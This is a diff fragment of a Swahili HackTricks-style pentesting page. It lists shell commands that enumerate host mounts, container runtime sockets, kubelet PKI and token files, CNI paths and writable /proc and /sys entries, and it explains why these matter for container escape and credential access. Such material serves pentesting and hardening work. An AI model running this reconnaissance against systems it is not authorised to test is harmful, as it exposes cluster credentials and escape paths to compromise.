 find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
 find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
+find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
+ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
-Kinachovutia hapa:
+Nini cha kuvutia hapa:
 
-- Host root, `/proc`, `/sys`, `/var`, na runtime sockets ni matokeo zenye kipaumbele cha juu.
-- Mafungu ya proc/sys yanayoweza kuandikwa mara nyingi yanaonyesha kuwa mount inafichua host-global kernel controls badala ya mtazamo salama wa container.
-- Njia zilizopakiwa za `/var` zinastahili ukaguzi wa credential na neighboring-workload, si ukaguzi wa filesystem peke yake.
+- Host root, `/proc`, `/sys`, `/var`, na runtime sockets zote ni matokeo ya kipaumbele cha juu.
+- Writable proc/sys entries mara nyingi humaanisha mount inaonyesha host-global kernel controls badala ya safe container view.
+- Mounted `/var` paths zinastahili credential na neighboring-workload review, sio filesystem review pekee.
+- Kubelet state directories na CNI/plugin paths zinastahili kipaumbele sawa na runtime sockets kwa sababu mara nyingi hukaa moja kwa moja kwenye node's pod-creation na credential-distribution path.
+
+## References
+
+- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
+- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
 {{#include ../../../banners/hacktricks-training.md}}
